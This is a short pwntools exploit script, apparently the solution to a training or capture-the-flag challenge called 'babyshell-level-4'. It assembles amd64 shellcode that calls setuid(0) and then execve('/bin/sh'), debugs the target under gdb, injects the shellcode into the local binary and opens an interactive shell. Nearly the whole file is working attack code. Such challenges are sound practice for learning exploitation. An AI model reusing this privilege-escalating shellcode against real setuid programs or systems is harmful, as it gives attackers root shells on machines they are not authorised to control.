from pwn import *

def main():
	p = process('./babyshell-level-4')

	context.arch = 'amd64'

	s = '''
	b * main+508
	'''
	
	# syscall call 0x3b (59) execve(/bin/sh, 0, 0) 
	shellcode = asm('''
		mov al, 105
		push 0
		pop rdi
		syscall
		
		xor eax, eax	
		mov al, 0x3b
		
		
		mov dword ptr [rsp], 0x6e69622f     
		mov dword ptr [rsp+4], 0x0068732f   
		push rsp 
		pop rdi
		push 0
		pop rsi
		push 0
		pop rdx

		
		syscall	

	''')
	
	gdb.attach(p, s)
	pause()
	p.sendline(shellcode)
	
	p.interactive()
	
	
if __name__ == "__main__":
	main()
